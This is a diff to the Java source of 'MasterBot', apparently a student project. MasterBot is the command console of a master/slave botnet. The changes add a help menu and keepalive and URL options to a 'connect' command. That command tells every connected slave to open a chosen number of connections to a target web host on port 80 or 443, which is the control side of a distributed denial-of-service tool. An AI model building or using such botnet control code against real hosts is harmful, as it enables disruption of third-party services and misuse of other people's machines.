@@ -7,7 +7,8 @@ public class MasterBot extends Thread
 {
 //--variable declarations----------------------------------------------------------------------------------------------------------------------
 	private ServerSocket ms;
-	static String slaveIPAddress, targetIPAddress;
+	static boolean keepAlive;
+	static String slaveIPAddress, targetIPAddress, url;
 	static int noOfSlavesConnected, targetPort, connectionCount, successfulConnects, successfulDisconnects;
 	static HashMap<String, ArrayList<Socket>> slavetoRemote = new HashMap<String, ArrayList<Socket>>();
 	static ArrayList<Socket> clientList = new ArrayList<>();
@@ -44,7 +45,7 @@ public class MasterBot extends Thread
 				
 				data = "Slave" + noOfSlavesConnected + "\t";
 				bw.write(data);
-
+				
 				data = "\t" + ss.getRemoteSocketAddress() + "\t";
 				bw.write(data);
 
@@ -79,12 +80,12 @@ public class MasterBot extends Thread
 		String commandLine;
 		BufferedReader br1 = new BufferedReader(new InputStreamReader(System.in));
 		int port = 0;
-//------input format example = "java MasterBot -p 9999"
+		//input format example = "java MasterBot -p 9999"
 		if (args.length != 0) 
 		{
 			port = Integer.parseInt(args[1]);
 		} 
-//------input format example = "java MasterBot"
+		//input format example = "java MasterBot"
 		else 
 		{
 			System.out.println("Using default port number 2317");
@@ -103,21 +104,28 @@ public class MasterBot extends Thread
 			}
 		}
 //------command line implementation 
+		System.out.println("> Welcome to shell \n Type 'help' for more details.");
 		while (true) 
 		{
 			try 
 			{
-				System.out.print("> ");
+				System.out.print(">");
 				commandLine = br1.readLine();
 //--------------loop if no data is entered
 				if (commandLine.equals("")) 
 				{
+					System.out.println("> type help for more details \n");
 					continue;
 				}
-//--------------display ArrayList of Clients
-				else if (commandLine.equalsIgnoreCase("clientList")) 
+//--------------help function logic
+				else if (commandLine.equals("help"))
 				{
-					System.out.println(clientList);
+					System.out.println("*********************Welcome to Shell Help*********************");
+					System.out.println("List of available commands:");
+					System.out.println("1) list");
+					System.out.println("2) connect (Example	: connect all www.sjsu.edu 80 10(optional) keepalive(optional) url=/#q=(optional)).");
+					System.out.println("3) disconnect (Example : disconnect all www.sjsu.edu 80 10(optional))");
+					System.out.println("4) exit \n");
 					continue;
 				}
 //--------------list function logic
@@ -135,8 +143,10 @@ public class MasterBot extends Thread
 //--------------connect function logic
 				else if (commandLine.startsWith("connect")) 
 				{
+					keepAlive = false;
+					url = null;
 					successfulConnects = 0;
-//------------------if no slaves are connected
+					//if no slaves are connected
 					if(noOfSlavesConnected == 0)
 					{
 						System.out.println("No Slaves are currently connected to the server.\n");
@@ -144,7 +154,7 @@ public class MasterBot extends Thread
 					}
 					
 					String[] dataArray = commandLine.split("\\s+");
-//------------------if number of connections is not defined
+					//if number of connections is not defined (Example : connect all www.sjsu.edu 80)
 					if(dataArray.length == 4)
 					{
 						slaveIPAddress = dataArray[1];
@@ -152,7 +162,25 @@ public class MasterBot extends Thread
 						targetPort = Integer.parseInt(dataArray[3]);
 						connectionCount = 1;
 					}
-//------------------if number of connections is defined
+					//if only keepalive is requested (Example : connect all www.sjsu.edu 80 keepalive) 
+					else if(dataArray.length == 5 && dataArray[4].contains("keepalive"))
+					{
+						slaveIPAddress = dataArray[1];
+						targetIPAddress = dataArray[2];
+						targetPort = Integer.parseInt(dataArray[3]);
+						connectionCount = 1;
+						keepAlive = true;
+					}
+					//if only url is provided (Example : connect all www.sjsu.edu 80 url=) 
+					else if(dataArray.length == 5 && dataArray[4].contains("url"))
+					{
+						slaveIPAddress = dataArray[1];
+						targetIPAddress = dataArray[2];
+						targetPort = Integer.parseInt(dataArray[3]);
+						url = dataArray[4].substring(4);
+						connectionCount = 1;
+					}
+					//if  only connection count is provided (Example : connect all www.sjsu.edu 80 10 
 					else if(dataArray.length == 5)
 					{
 						slaveIPAddress = dataArray[1];
@@ -160,33 +188,62 @@ public class MasterBot extends Thread
 						targetPort = Integer.parseInt(dataArray[3]);
 						connectionCount = Integer.parseInt(dataArray[4]);
 					}
-//------------------for invalid formats
+					//if keepalive is requested with connection count (Example : connect all www.sjsu.edu 80 10 keepalive) 
+					else if(dataArray.length == 6 && dataArray[5].contains("keepalive"))
+					{
+						slaveIPAddress = dataArray[1];
+						targetIPAddress = dataArray[2];
+						targetPort = Integer.parseInt(dataArray[3]);
+						connectionCount = Integer.parseInt(dataArray[4]);
+						keepAlive = true;
+					}
+					//if url is provided with connection count (Example : connect all www.sjsu.edu 80 10 url=) 
+					else if(dataArray.length == 6 && dataArray[5].contains("url"))
+					{
+						slaveIPAddress = dataArray[1];
+						targetIPAddress = dataArray[2];
+						targetPort = Integer.parseInt(dataArray[3]);
+						connectionCount = Integer.parseInt(dataArray[4]);
+						url = dataArray[5].substring(4);
+					}
+					//if everything is provided (Example : connect all www.sjsu.edu 80 10 keepalive url=)
+					else if(dataArray.length == 7 && dataArray[5].contains("keepalive"))
+					{
+						slaveIPAddress = dataArray[1];
+						targetIPAddress = dataArray[2];
+						targetPort = Integer.parseInt(dataArray[3]);
+						connectionCount = Integer.parseInt(dataArray[4]);
+						keepAlive = true;
+						url = dataArray[6].substring(4);;
+					}	
+					//for invalid formats
 					else if(dataArray.length < 4)
 					{
-						System.out.println("Invalid Format. \n Connect Format = Example : connect all www.sjsu.edu 80.");
+						System.out.println("Invalid Format. Type 'help' for more details.\n");
+						continue;
 					}
-//------------------if targetPort is invalid
+					//if targetPort is invalid
 					if(targetPort!=80)
 					{
 						if(targetPort!=443)
 						{
-							System.out.println("Available Target Ports : 80, 443.");
+							System.out.println("Available Target Ports : 80, 443. Type 'help' for more details.\n");
 							continue;
 						}
 					}
-//------------------for all slaves (Example : connect all www.sjsu.edu 80)
+					//for all slaves (Example : connect all www.sjsu.edu 80)
 					if (slaveIPAddress.equalsIgnoreCase("all"))
 					{
 						for(int i=0; i<clientList.size(); i++)
 						{
 							for(int j=0; j<connectionCount; j++)
 							{
-								slavetoRemote = b.connect(clientList.get(i), targetIPAddress, targetPort);
+								slavetoRemote = b.connect(clientList.get(i), targetIPAddress, targetPort, keepAlive, url);
 								successfulConnects++;
 							}
 						}
 					}
-//------------------for specific slave (Example : connect 127.0.0.1:52317 www.sjsu.edu 80)
+					//for specific slave (Example : connect 127.0.0.1:52317 www.sjsu.edu 80)
 					else
 					{
 						String line;
@@ -198,7 +255,7 @@ public class MasterBot extends Thread
 							{
 								for(int j=0; j<connectionCount; j++)
 								{
-									slavetoRemote = b.connect(clientList.get(i), targetIPAddress, targetPort);
+									slavetoRemote = b.connect(clientList.get(i), targetIPAddress, targetPort, keepAlive, url);
 									successfulConnects++;
 								}
 							}
@@ -212,15 +269,15 @@ public class MasterBot extends Thread
 				{
 					successfulDisconnects = 0;
 					boolean connectionCountProvided = true;
-//------------------if no slaves are connected
+					//if no slaves are connected
 					if(noOfSlavesConnected == 0)
 					{
 						System.out.println("No Slaves are currently connected to the server.\n");
 						continue;
 					}
-//------------------String array to capture arguments
+					//String array to capture arguments
 					String[] dataArray = commandLine.split("\\s+");
-//------------------if number of connections is not defined
+					//if number of connections is not defined
 					if(dataArray.length == 4)
 					{
 						slaveIPAddress = dataArray[1];
@@ -228,7 +285,7 @@ public class MasterBot extends Thread
 						targetPort = Integer.parseInt(dataArray[3]);
 						connectionCountProvided = false;
 					}
-//------------------if number of connections is defined
+					//if number of connections is defined
 					else if(dataArray.length == 5)
 					{
 						slaveIPAddress = dataArray[1];
@@ -237,21 +294,22 @@ public class MasterBot extends Thread
 						connectionCount = Integer.parseInt(dataArray[4]);
 						connectionCountProvided = true;
 					}
-//------------------for invalid formats
+					//for invalid formats
 					else if(dataArray.length < 4)
 					{
-						System.out.println("Invalid Format. \n Connect Format = Example : connect all www.sjsu.edu 80.");
+						System.out.println("Invalid Format. Type 'help' for more details.\n");
+						continue;
 					}
-//------------------if targetPort is invalid
+					//if targetPort is invalid
 					if(targetPort!=80)
 					{
 						if(targetPort!=443)
 						{
-							System.out.println("Available Target Ports : 80, 443.");
+							System.out.println("Available Target Ports : 80, 443. Type 'help' for more details.\n");
 							continue;
 						}
 					}
-//------------------for all slaves with no number of connections provided (Example : disconnect all www.sjsu.edu 80)
+					//for all slaves with no number of connections provided (Example : disconnect all www.sjsu.edu 80)
 					if (slaveIPAddress.equalsIgnoreCase("all") && connectionCountProvided == false)
 					{
 						for(int i=0; i<clientList.size(); i++)
@@ -274,7 +332,7 @@ public class MasterBot extends Thread
 							}
 						}
 					}
-//------------------for all slaves with number of connections provided (Example : disconnect all www.sjsu.edu 80 5)
+					//for all slaves with number of connections provided (Example : disconnect all www.sjsu.edu 80 5)
 					else if (slaveIPAddress.equalsIgnoreCase("all") && connectionCountProvided == true)
 					{
 						int currentConnectionCount = slavetoRemote.size() * connectionCount;
@@ -302,7 +360,7 @@ public class MasterBot extends Thread
 							}
 						}
 					}
-//------------------for selected slave with no number of connections provided (Example : disconnect 127.0.0.1:52317 www.sjsu.edu 80)
+					//for selected slave with no number of connections provided (Example : disconnect 127.0.0.1:52317 www.sjsu.edu 80)
 					else if (!slaveIPAddress.equalsIgnoreCase("all") && connectionCountProvided == false)
 					{
 						String line;
@@ -328,7 +386,7 @@ public class MasterBot extends Thread
 							}
 						}
 					}
-//------------------for selected slave with number of connections provided (Example : disconnect 127.0.0.1:52317 www.sjsu.edu 80 5)
+					//for selected slave with number of connections provided (Example : disconnect 127.0.0.1:52317 www.sjsu.edu 80 5)
 					else if (!slaveIPAddress.equalsIgnoreCase("all") && connectionCountProvided == true)
 					{
 						String line;
@@ -358,7 +416,7 @@ public class MasterBot extends Thread
 							}
 						}
 					}
-					System.out.println(successfulDisconnects + " connections were terminated.");
+					System.out.println(successfulDisconnects + " connections were terminated.\n");
 					continue;
 				}
 //--------------exit function logic
@@ -369,7 +427,7 @@ public class MasterBot extends Thread
 				}
 				else
 				{
-					System.out.println("Available Commands are : list, connect, disconnect and exit.");
+					System.out.println("> type help for more details \n");
 					continue;
 				}
 				
